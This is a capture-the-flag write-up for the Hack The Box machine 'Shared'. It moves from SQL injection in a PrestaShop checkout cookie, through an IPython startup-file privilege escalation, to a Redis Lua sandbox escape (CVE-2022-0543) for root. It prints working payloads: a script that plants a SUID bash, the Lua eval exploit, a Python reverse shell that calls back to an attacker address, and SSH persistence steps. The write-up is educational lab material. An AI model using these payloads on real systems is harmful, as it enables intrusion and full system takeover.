# Overview
This machine begins w/ finding a webpage created via PrestaShop, a huge hint is given right off the bat to direct our attention to a user-generated webpage that allows user to checkout their items. A SQLi vulnerability is discovered in the checkout page, allowing us to enumerate the checkout database, revealing user credentials.

For the privilege escalation part, we have to escalate our privileges twice, to dan_smith and to root. A ipython vulnerability is discovered allowing user to run code as another user allowing to privilege escalate to dan_smith.

Once dan_smith user is obtained, we are able to obtain a password via an ELF executable file where it connects to redis-cli w/ a password. The password allows us to connect to redis-cli where we are able to execute arbitrary code on the host, rooting the machine.

4. There are many exploits that are available, however we do not know the version of `PrestaShop` running on this website.
5. After doing some research, to get the version of `PrestaShop` we have to
	1. Find the admin web directory, which is usually named `admin_<randomly generated number>`
		- [Source](https://www.inmotionhosting.com/support/edu/prestashop/login-prestashop-dashboard/#:~:text=Logging%20in%20after%20the%20first,will%20now%20include%20that%20number.)
	2. Proceed to Advanced Parameters -> Configuration information
		- [Source](https://www.inmotionhosting.com/support/edu/prestashop/version-info-prestashop/#:~:text=The%20version%20of%20PrestaShop%20can,php%20file.)
	- Before proceeding with this, I went back to the first page to see if I missed anything
6. I went back to the first page and spotted the clue, there is a page (checkout), that is custom created due to certain technical issues.
	- Custom created page is very likely to contain vulnerabilities that can be exploited
7. Add a random item to your cart, and proceed to checkout
	![](Pasted%20image%2020220804211408.png)
	- Add `checkout.shared.htb` to `/etc/hosts`
8. Submit cart
	![](Pasted%20image%2020220804211528.png)![](Pasted%20image%2020220804211720.png)
	- There is a custom cookie, `custom_cart=%7B%227DA8SKYP%22%3A%221%22%7D;`, 
		- It stores the item that we have added to our cart.
		- URL decoded: `{"7DA8SKYP":"1"};`
			- `{<Item code>:<Quantity>}`
			- `custom_cart=%7B%22<SQLi>%22%3A%221%22%7D;`
9. Attempt SQLi, it works!

## SQLi Database Enumeration

# Privilege Escalation 
## Dan_Smith - iPython Exploit
1. Transfer `pspy64` & `linpeas` into `shared.htb`
2. Linpeas, found something interesting
	![](Pasted%20image%2020220804232053.png)
	- `james_mason` belongs to group `developer` that has `RWX` access to directory `/opt/scripts_review`
3. Run `pspy64`, found something interesting
	![](Pasted%20image%2020220804231413.png)
	- Things to note:
		- `ipython`
		- `/opt/scripts_review`
		- `UID=1001`
	- A cronjob is running every minute, `/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython` is executed by `dan_smith`
4. Find out who is UID `1001`
	```
	james_mason@shared:~$ cat /etc/passwd | grep 1001
	dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
	```
	- `dan_smith`
		- User Flag resides in `dan_smith` home directory
5. Research `ipython` exploit/privilege escalation
	- [POC](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x)
6. How does the exploit work
	- Arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.
	1. Based on the cronjob `ipython` is executed at `/opt/scripts_review` directory where we have write access
	2. We have to create `/opt/scripts_review/profile_default` & `/opt/scripts_review/profile_default/startup`
	3. We have to create a python script that will set `dan_smith` SUID bit to `/bin/bash` for us to privilege escalate at `/opt/scripts_review/profile_default/startup`
		- Alternative is a script (reverse shell) that will connect to Kali, however `nc` is not available
	4. Wait for cronjob to execute at `/opt/scripts_review` as `dan_smith` to privilege escalate
 7. Create script to create directory and python script & execute `script.sh`
	```
	james_mason@shared:/tmp$ cat script.sh 
	mkdir -m 777 /opt/scripts_review/profile_default
	mkdir -m 777 /opt/scripts_review/profile_default/startup
	echo 'import os; os.system("cp /bin/bash /tmp/danbash; chmod u+s /tmp/danbash")' > /opt/scripts_review/profile_default/startup/foo.py

	james_mason@shared:/tmp$ chmod +x script.sh
	james_mason@shared:/tmp$ ./script.sh
	```
	- There is also a cronjob running as `root` that will delete everything in `scripts_review` directory, keep running `script.sh` to ensure exploit is not deleted
8. Wait for cronjob to execute to create `danbash`, and execute `danbash`
	```
	james_mason@shared:/tmp$ ls -la danbash 
	-rwsr-xr-x 1 dan_smith dan_smith 1234376 Aug  4 11:30 danbash	
	```
	![](Pasted%20image%2020220804233107.png)
9. Obtain persistent access to `dan_smith` via SSH
	1. Place your private key into `.ssh/authorized_keys`
		```
		echo "..your private key..." > .ssh/authorized_keys
		```
	2. Change permission of authorized_keys
		```
		chmod 700 .ssh
		chmod 600 .ssh/authorized_keys
		```
	3. SSH into target
		```
		ssh dan_smith@shared.htb
		```

## Root - Redis Lua Sandbox Escape and Remote Code Execution
1. Linpeas, found something interesting
	![](Pasted%20image%2020220805041420.png)
	- `redis_connector_dev`
2. Execute it 
	```
	dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
	[+] Logging to redis instance using password...
	
	INFO command result:
	# Server
	redis_version:6.0.15
	redis_git_sha1:00000000
	redis_git_dirty:0
	redis_build_id:4610f4c3acf7fb25
	redis_mode:standalone
	os:Linux 5.10.0-16-amd64 x86_64
	arch_bits:64
	multiplexing_api:epoll
	atomicvar_api:atomic-builtin
	gcc_version:10.2.1
	process_id:12655
	run_id:b2c6cdd30f4d669d21404c0d5f85d3a5c8ac65ef
	tcp_port:6379
	uptime_in_seconds:1
	uptime_in_days:0
	hz:10
	configured_hz:10
	lru_clock:15476939
	executable:/usr/bin/redis-server
	config_file:/etc/redis/redis.conf
	io_threads_active:0
	 <nil>
	```
	- It is an ELF file, when executed, connects to `redis-cli` using a password, executing `INFO` command
3. Tried to use `strings` to attempt to find the password, failed
4. We can exploit this by analyzing the wireshark traffic generated from executing the ELF executable
5. Transfer `redis_connector_dev` to Kali 
6. Start wireshark capture, listener and execute and execute `redis_connector_dev`
	![](Pasted%20image%2020220805042045.png)
	![](Pasted%20image%2020220805042202.png)
	- Found Credentials:  `auth F2WHqJUz2WEz=Gqq`
7. Search exploits for `redis-cli`
	![](Pasted%20image%2020220805042439.png)
	- [Source](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)
8. Exploit explanation
	- Due to a packaging issue on Debian/Ubuntu, a remote attacker with the ability to execute arbitrary Lua scripts could possibly escape the Lua sandbox and execute arbitrary code on the host.
9. Connect to `redis-cli`, and test the POC
	```
	# Payload
	eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
	```
	![](Pasted%20image%2020220805042901.png)
	- Authentication required
10. Authenticate w/ `AUTH F2WHqJUz2WEz=Gqq` and execute the command again
	![](Pasted%20image%2020220805042948.png)
11. Tried a lot of ways to obtain a shell, only python3 reverse shell worked for me
	```
	dan_smith@shared:~$ nano /home/dan_smith/exploit.py
	
	import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.57",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
	```
12. Start listener
13. Execute `exploit.py` to obtain shell
	```
	eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("python3 /home/dan_smith/exploit.py", "r"); local res = f:read("*a"); f:close(); return res' 0
	```
	![](Pasted%20image%2020220805043508.png)
	- However, this shell is not stable, after a few seconds the shell closes.
14. Obtain persistent access to `root` via SSH 
	1. On any user account, create copy of `/etc/ssh/sshd_config`, and edit it to permit root login
		```
		dan_smith@shared:/dev/shm$ cp /etc/ssh/sshd_config /dev/shm/sshd_config
		
		nano /dev/shm/sshd_config
		```
		![](Pasted%20image%2020220805052253.png)
	2. Create `/root/.ssh`
		```
		# cd /root
		mkdir .ssh	
		```
	3. Place your private key into `/root/.ssh/authorized_keys`
		```
		echo "..your private key..." > .ssh/authorized_keys
		```
	4. Change permission of authorized_keys
		```
		chmod 700 .ssh
		chmod 600 .ssh/authorized_keys
		```
	5. Replace `/etc/ssh/sshd_config` w/ `/dev/shm/sshd_config`
	6. Restart ssh
		```
		service sshd restart
		```
	7. SSH into target
		```
		ssh root@shared.htb -i /root/.ssh/id_rsa
		```
